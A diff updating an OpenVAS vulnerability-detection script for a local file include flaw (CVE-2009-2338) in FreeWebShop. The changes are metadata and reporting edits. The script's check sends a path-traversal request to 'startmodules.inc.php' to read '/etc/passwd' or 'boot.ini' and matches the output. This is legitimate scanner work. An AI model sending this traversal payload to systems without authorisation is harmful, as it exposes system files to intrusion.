@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: FreeWebShop_34538.nasl 9425 2018-04-10 12:38:38Z cfischer $
+# $Id: FreeWebShop_34538.nasl 9791 2018-05-10 09:39:02Z ckuersteiner $
 #
 # FreeWebShop 'startmodules.inc.php' Local File Include Vulnerability
 #
@@ -29,14 +29,16 @@ CPE = "cpe:/a:freewebshop:freewebshop";
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100236");
- script_version("$Revision: 9425 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
+ script_version("$Revision: 9791 $");
+ script_tag(name:"last_modification", value:"$Date: 2018-05-10 11:39:02 +0200 (Thu, 10 May 2018) $");
  script_tag(name:"creation_date", value:"2009-07-21 20:55:39 +0200 (Tue, 21 Jul 2009)");
  script_bugtraq_id(34538);
  script_cve_id("CVE-2009-2338");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+
  script_name("FreeWebShop 'startmodules.inc.php' Local File Include Vulnerability");
+
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"WillNotFix");
@@ -46,10 +48,9 @@ if (description)
  script_require_ports("Services/www", 80);
  script_mandatory_keys("FreeWebshop/installed");
 
- script_tag(name:"solution", value:"No solution or patch was made available for at least one year
- since disclosure of this vulnerability. Likely none will be provided anymore.
- General solution options are to upgrade to a newer release, disable respective
- features, remove the product or replace the product by another one.");
+ script_tag(name:"solution", value:"No known solution was made available for at least one year since the
+disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
+a newer release, disable respective features, remove the product or replace the product by another one.");
 
  script_tag(name:"summary", value:"FreeWebShop is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.");
@@ -61,8 +62,8 @@ if (description)
  script_tag(name:"affected", value:"FreeWebShop 2.2.9 R2 is vulnerable, other versions may also be
  affected.");
 
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34538");
- script_xref(name : "URL" , value : "http://www.freewebshop.org");
+ script_xref(name: "URL", value: "http://www.securityfocus.com/bid/34538");
+ script_xref(name: "URL", value: "http://www.freewebshop.org");
  exit(0);
 }
 
@@ -76,12 +77,17 @@ if(!infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FA
 dir = infos['location'];
 
 if(!isnull(dir)) {
+  if (dir == "/")
+    dir = "";
+
   foreach file (make_list("/etc/passwd", "boot.ini")) {
-    url = string(dir, "/includes/startmodules.inc.php?lang_file=../../../../../../../../../../../../", file);
+    url = dir + "/includes/startmodules.inc.php?lang_file=../../../../../../../../../../../../" + file;
     req = http_get(item:url, port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-    if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {
-      security_message(port:port);
+
+    if (egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {
+      report = report_vuln_url(port: port, url: url);
+      security_message(port: port, data: report);
       exit(0);
     } 
   }
@@ -95,6 +101,7 @@ vers = infos['version'];
 if(!isnull(vers) && vers >!< "unknown") {
   vers = str_replace(find:"_", string: vers, replace:".");
   if(version_is_less_equal(version: vers, test_version: "2.2.9.R2", icase:TRUE)) {
+    report = report_fixed_ver(installed_version: vers, fixed_version: "None");
     security_message(port:port);
     exit(0);
   }
